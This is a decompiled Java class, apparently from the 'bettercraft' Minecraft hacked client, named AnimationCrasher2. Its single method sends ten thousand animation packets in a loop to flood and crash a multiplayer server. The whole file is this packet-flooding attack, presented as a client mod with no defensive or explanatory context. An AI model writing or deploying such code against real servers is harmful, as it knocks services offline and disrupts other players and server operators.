// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.ac;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.client.Minecraft;

public class AnimationCrasher2
{
    public static void start() {
        for (int i = 0; i < 10000; ++i) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketAnimation());
        }
    }
}
